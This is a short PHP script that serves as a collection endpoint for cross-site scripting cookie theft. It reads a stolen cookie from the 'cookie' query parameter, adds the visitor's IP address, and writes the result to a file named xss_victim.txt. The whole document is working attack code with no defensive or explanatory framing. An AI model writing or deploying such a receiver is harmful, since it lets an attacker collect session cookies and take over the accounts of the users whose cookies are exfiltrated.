<?php  
  $victim = 'cookie we got:'. $_SERVER['REMOTE_ADDR']. ':' .$_GET['cookie'];  
  file_put_contents('xss_victim.txt', $victim);
?>
